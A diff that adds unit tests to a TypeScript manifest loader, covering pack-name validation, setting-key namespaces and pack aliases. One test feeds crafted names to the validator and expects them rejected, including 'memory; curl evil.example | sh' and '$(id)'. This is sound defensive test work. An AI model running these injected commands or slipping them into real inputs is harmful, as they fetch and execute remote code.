@@ -43,6 +43,13 @@ describe("loadPacks", () => {
     expect(loadPacks(sourceWith({ base: { ...base, title: "" } }))).rejects.toThrow("title must be the name people read");
   });
 
+  test("accepts a required pack only by a pack name, so a crafted name cannot reach a command", async () => {
+    await expect(loadPacks(sourceWith({ base: { ...base, requires: ["memory", "pull-requests"] } }))).resolves.toHaveLength(1);
+    for (const name of ["memory; curl evil.example | sh", "$(id)", "memory\nid", "Memory", "-x", ""]) {
+      await expect(loadPacks(sourceWith({ base: { ...base, requires: [name] } }))).rejects.toThrow(`requires ${JSON.stringify(name)}: must be a pack name in lowercase words joined by dashes`);
+    }
+  });
+
   test("rejects a manifest whose name is not its directory", async () => {
     expect(loadPacks(sourceWith({ other: base }))).rejects.toThrow("name base does not match its directory other");
   });
@@ -50,6 +57,19 @@ describe("loadPacks", () => {
   test("rejects a setting outside the pack's namespace", async () => {
     const settings = [{ ...base.settings[0], key: "hub.heavySlots" }];
     expect(loadPacks(sourceWith({ base: { ...base, settings } }))).rejects.toThrow("setting hub.heavySlots must start with base.");
+  });
+
+  test("lets a setting start with an old name of the pack or a prefix the pack lists, and no other", async () => {
+    const settings = [{ ...base.settings[0], key: "old.heavySlots" }, { ...base.settings[0], key: "hub.cap" }];
+    const renamed = { ...base, settings, aliases: [{ name: "old", workflows: ["heavy"] }] };
+    const [pack] = await loadPacks(sourceWith({ base: { ...renamed, settingPrefixes: ["hub"] } }));
+    expect(pack!.manifest.settings!.map((setting) => setting.key)).toEqual(["old.heavySlots", "hub.cap"]);
+    expect(loadPacks(sourceWith({ base: renamed }))).rejects.toThrow("setting hub.cap must start with base. or old.");
+  });
+
+  test("rejects an old name that is the pack's own, or that names a workflow the pack does not have", async () => {
+    expect(loadPacks(sourceWith({ base: { ...base, aliases: [{ name: "base", workflows: [] }] } }))).rejects.toThrow("aliases base: name must be another pack name");
+    expect(loadPacks(sourceWith({ base: { ...base, aliases: [{ name: "old", workflows: ["missing"] }] } }))).rejects.toThrow("alias old names unknown workflow missing");
   });
 
   test("lets any pack declare identity.signer, which the engine reads", async () => {
